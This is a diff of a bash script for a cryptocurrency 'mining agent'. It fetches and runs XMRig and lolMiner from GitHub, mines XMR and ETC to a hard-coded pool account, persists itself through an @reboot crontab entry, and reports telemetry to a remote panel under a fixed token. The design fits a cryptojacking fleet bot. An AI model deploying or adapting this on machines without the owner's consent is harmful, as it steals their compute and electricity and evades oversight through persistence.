@@ -2,11 +2,9 @@
 set -u
 
 #################################################
-# MINING AGENT — FINAL / TELEMETRY CORRECT
-# Works without systemd, non-root, container-safe
+# MINING AGENT — CPU + GPU + GPU HASHRATE
 #################################################
 
-# ===== SAFETY (явное разрешение) =====
 [ "${ALLOW_MINING:-0}" = "1" ] || exit 0
 
 # ===== PANEL =====
@@ -15,9 +13,12 @@ TOKEN="mamont22187"
 INTERVAL=30
 HOST="$(hostname)"
 
-# ===== MINER =====
-POOL="xmr.kryptex.network:7029"
-USER="krxX3PVQVR.$HOST"
+# ===== ACCOUNTS =====
+KRIPTEX="krxX3PVQVR"
+
+# ===== POOLS =====
+XMR_POOL="xmr.kryptex.network:7029"
+ETC_POOL="etc.kryptex.network:7033"
 
 # ===== PATHS =====
 BASE="$HOME/.mining"
@@ -25,170 +26,144 @@ BIN="$BASE/bin"
 RUN="$BASE/run"
 LOG="$BASE/log"
 
-mkdir -p "$BIN/xmr" "$RUN" "$LOG" >/dev/null 2>&1
+mkdir -p "$BIN/cpu" "$BIN/gpu" "$RUN" "$LOG" >/dev/null 2>&1
 
 #################################################
-# HELPERS
+# UTILS
 #################################################
 
 json_escape() { echo "$1" | sed 's/"/\\"/g'; }
 
-retry() {
-  i=0
-  while [ $i -lt 5 ]; do
-    "$@" && return 0
-    i=$((i+1))
-    sleep $((i*2))
-  done
-  return 1
-}
-
 post() {
-  retry curl -s "$1" \
+  curl -s "$1" \
     -H "Content-Type: application/json" \
     -H "token: $TOKEN" \
     -d "$2" >/dev/null 2>&1
 }
 
 #################################################
-# EVENTS
+# INSTALL
 #################################################
 
-send_event() {
-  post "$PANEL/api/event" "{
-    \"hostname\": \"$HOST\",
-    \"level\": \"$1\",
-    \"message\": \"$(json_escape "$2")\"
-  }"
+install_xmrig() {
+  [ -x "$BIN/cpu/xmrig" ] && return
+  wget -q https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-linux-x64.tar.gz -O /tmp/xmr.tgz || return
+  tar -xzf /tmp/xmr.tgz -C "$BIN/cpu" --strip-components=1
+  chmod +x "$BIN/cpu/xmrig"
+}
+
+install_lolminer() {
+  [ -x "$BIN/gpu/lolMiner" ] && return
+  wget -q https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.98/lolMiner_v1.98_Lin64.tar.gz -O /tmp/lol.tgz || return
+  tar -xzf /tmp/lol.tgz -C "$BIN/gpu" --strip-components=1
+  chmod +x "$BIN/gpu/lolMiner"
 }
 
 #################################################
-# METRICS (FACTS ONLY)
+# CPU (xmrig)
 #################################################
 
-# hashrate from XMRig HTTP API
-get_hashrate() {
+start_cpu() {
+  stop_cpu
+  nohup "$BIN/cpu/xmrig" \
+    -o "$XMR_POOL" \
+    -u "$KRIPTEX.$HOST" -p x \
+    --http-enabled --http-host 127.0.0.1 --http-port 16000 \
+    >> "$LOG/cpu.log" 2>&1 &
+  echo $! > "$RUN/cpu.pid"
+}
+
+stop_cpu() {
+  [ -f "$RUN/cpu.pid" ] && kill "$(cat "$RUN/cpu.pid")" 2>/dev/null || true
+  rm -f "$RUN/cpu.pid"
+}
+
+#################################################
+# GPU (lolMiner) + API
+#################################################
+
+start_gpu() {
+  stop_gpu
+  nohup "$BIN/gpu/lolMiner" \
+    --algo ETCHASH \
+    --pool "$ETC_POOL" \
+    --user "$KRIPTEX.$HOST" \
+    --apihost 127.0.0.1 \
+    --apiport 8080 \
+    >> "$LOG/gpu.log" 2>&1 &
+  echo $! > "$RUN/gpu.pid"
+}
+
+stop_gpu() {
+  [ -f "$RUN/gpu.pid" ] && kill "$(cat "$RUN/gpu.pid")" 2>/dev/null || true
+  rm -f "$RUN/gpu.pid"
+}
+
+#################################################
+# HASHRATES
+#################################################
+
+# CPU H/s
+get_cpu_hashrate() {
   curl -s --max-time 2 http://127.0.0.1:16000/1/summary \
     | grep -oE '"total":\[[^]]+' \
     | grep -oE '[0-9]+(\.[0-9]+)?' \
     | head -1 || echo 0
 }
 
-# cpu temp
-get_cpu_temp() {
-  sensors 2>/dev/null \
-    | awk '/Package id 0:|Tctl:/ {gsub(/[+°C]/,"",$NF); print int($NF)}' \
-    | head -1
+# GPU MH/s → H/s
+get_gpu_hashrate() {
+  curl -s --max-time 2 http://127.0.0.1:8080/summary \
+    | grep -oE '"Performance":[ ]*[0-9]+(\.[0-9]+)?' \
+    | grep -oE '[0-9]+(\.[0-9]+)?' \
+    | awk '{ printf "%.0f", $1 * 1000000 }' || echo 0
 }
 
-# gpu temp
+#################################################
+# METRICS
+#################################################
+
+get_cpu_temp() {
+  sensors 2>/dev/null | awk '/Package id 0:|Tctl:/ {gsub(/[+°C]/,"",$NF); print int($NF)}' | head -1
+}
+
 get_gpu_temp() {
   nvidia-smi --query-gpu=temperature.gpu --format=csv,noheader 2>/dev/null | head -1
 }
 
-# uptime
-get_uptime() {
-  uptime -p 2>/dev/null
-}
+get_uptime() { uptime -p 2>/dev/null; }
+get_load() { uptime | awk -F'load average:' '{print $2}' | cut -d',' -f1 | xargs; }
+gpu_detected() { lspci | grep -qiE "nvidia|amd" && echo true || echo false; }
 
-# load
-get_load() {
-  uptime 2>/dev/null | awk -F'load average:' '{print $2}' | cut -d',' -f1 | xargs
-}
+#################################################
+# TELEMETRY
+#################################################
 
-# gpu detected
-gpu_detected() {
-  lspci 2>/dev/null | grep -qiE "nvidia|amd" && echo true || echo false
+send_telemetry() {
+  CPU_HR=$(get_cpu_hashrate)
+  GPU_HR=$(get_gpu_hashrate)
+  TOTAL_HR=$((CPU_HR + GPU_HR))
+
+  post "$PANEL/api/telemetry" "{
+    \"hostname\": \"$HOST\",
+    \"cpu_mining\": \"$([ -f "$RUN/cpu.pid" ] && echo running || echo stopped)\",
+    \"gpu_mining\": \"$([ -f "$RUN/gpu.pid" ] && echo running || echo stopped)\",
+    \"gpu_detected\": $(gpu_detected),
+    \"hashrate\": $TOTAL_HR,
+    \"cpu_temp\": $(get_cpu_temp || echo null),
+    \"gpu_temp\": $(get_gpu_temp || echo null),
+    \"uptime\": \"$(json_escape "$(get_uptime)")\",
+    \"load\": $(get_load || echo null)
+  }"
 }
 
 #################################################
-# XMRIG CONTROL
-#################################################
-
-start_xmrig() {
-  stop_xmrig
-  nohup "$BIN/xmr/xmrig" \
-    -o "$POOL" -u "$USER" -p x \
-    --http-enabled --http-host 127.0.0.1 --http-port 16000 \
-    >> "$LOG/xmrig.log" 2>&1 &
-  echo $! > "$RUN/xmrig.pid"
-}
-
-stop_xmrig() {
-  [ -f "$RUN/xmrig.pid" ] && kill "$(cat "$RUN/xmrig.pid")" 2>/dev/null || true
-  rm -f "$RUN/xmrig.pid"
-}
-
-#################################################
-# INSTALL XMRIG
-#################################################
-
-install_xmrig() {
-  [ -x "$BIN/xmr/xmrig" ] && return
-  retry wget -q https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-linux-x64.tar.gz -O /tmp/xmr.tgz || return
-  tar -xzf /tmp/xmr.tgz -C "$BIN/xmr" --strip-components=1
-  chmod +x "$BIN/xmr/xmrig"
-}
-
-#################################################
-# AUTOSTART (REBOOT SAFE)
+# AUTOSTART
 #################################################
 
 ensure_autostart() {
   crontab -l 2>/dev/null | grep -q "ALLOW_MINING=1 $BASE/min.sh" && return
   (crontab -l 2>/dev/null; echo "@reboot ALLOW_MINING=1 $BASE/min.sh") | crontab -
-}
-
-#################################################
-# CONTROL QUEUE
-#################################################
-
-check_control() {
-  CMD=$(curl -s "$PANEL/api/control/pending?hostname=$HOST" -H "token: $TOKEN")
-  echo "$CMD" | grep -q '"action"' || return
-
-  ID=$(echo "$CMD" | grep -oE '"id":[0-9]+' | grep -oE '[0-9]+')
-  ACT=$(echo "$CMD" | grep -oE '"action":"[^"]+' | cut -d'"' -f4)
-
-  case "$ACT" in
-    start_cpu) start_xmrig ;;
-    stop_cpu) stop_xmrig ;;
-    restart_all) stop_xmrig; start_xmrig ;;
-    install_miner) install_xmrig; start_xmrig ;;
-  esac
-
-  post "$PANEL/api/control/ack" "{
-    \"hostname\": \"$HOST\",
-    \"command_id\": $ID,
-    \"result\": \"success\",
-    \"message\": \"$(json_escape "$ACT executed")\"
-  }"
-
-  send_event "INFO" "control: $ACT"
-}
-
-#################################################
-# TELEMETRY (SOURCE OF TRUTH)
-#################################################
-
-send_telemetry() {
-  HASHRATE="$(get_hashrate)"
-  CPU_TEMP="$(get_cpu_temp)"
-  GPU_TEMP="$(get_gpu_temp)"
-  UPTIME="$(get_uptime)"
-  LOAD="$(get_load)"
-
-  post "$PANEL/api/telemetry" "{
-    \"hostname\": \"$HOST\",
-    \"cpu_mining\": \"$([ -f "$RUN/xmrig.pid" ] && echo running || echo stopped)\",
-    \"gpu_mining\": \"stopped\",
-    \"gpu_detected\": $(gpu_detected),
-    \"hashrate\": $HASHRATE,
-    \"cpu_temp\": ${CPU_TEMP:-null},
-    \"gpu_temp\": ${GPU_TEMP:-null},
-    \"uptime\": \"$(json_escape "$UPTIME")\",
-    \"load\": ${LOAD:-null}
-  }"
 }
 
 #################################################
@@ -198,26 +173,14 @@ send_telemetry() {
 agent() {
   ensure_autostart
   install_xmrig
-  start_xmrig
-  send_event "INFO" "agent started"
+  install_lolminer
+  start_cpu
+  start_gpu
 
-  ZERO=0
   while true; do
-    HR="$(get_hashrate)"
-
-    if [ "$HR" = "0" ]; then
-      ZERO=$((ZERO+1))
-      [ "$ZERO" -ge 3 ] && {
-        send_event "CRITICAL" "hashrate = 0"
-        start_xmrig
-        ZERO=0
-      }
-    else
-      ZERO=0
-    fi
-
+    [ -f "$RUN/cpu.pid" ] || start_cpu
+    [ -f "$RUN/gpu.pid" ] || start_gpu
     send_telemetry
-    check_control
     sleep "$INTERVAL"
   done
 }
